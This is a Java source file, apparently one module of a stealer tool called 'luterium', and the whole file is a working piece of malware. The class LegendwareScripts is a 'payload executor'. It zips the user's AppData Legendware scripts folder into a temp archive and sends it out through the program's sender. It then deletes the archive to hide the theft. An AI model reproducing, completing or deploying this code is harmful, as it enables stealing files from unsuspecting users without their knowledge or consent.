package dev.peter.luterium.features;

import dev.peter.luterium.Main;
import dev.peter.luterium.payload.PayloadExecutor;
import dev.peter.luterium.utils.FileUtil;
import org.zeroturnaround.zip.ZipUtil;

import java.io.File;
import java.util.Optional;

/**
 * @author Peter
 * @since 09/13/2022
 * Gets Legendware's script folder(since it uses configs from the cloud).
 */

public class LegendwareScripts implements PayloadExecutor {
    Main main = new Main();

    String path = System.getProperty("user.home") + "\\AppData\\Roaming\\Legendware\\Scripts";
    String zipPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\oof2.zip";

    @Override
    public void execute() throws Exception {
        ZipUtil.pack(new File(path), new File(zipPath));

        Optional<File> file = FileUtil.getFile(zipPath);
        file.ifPresent(main.theThing::send);

        deleteFileAfterSent();
    }

    public void deleteFileAfterSent() {
        File zipFile = new File(zipPath);

        zipFile.delete();
    }
}
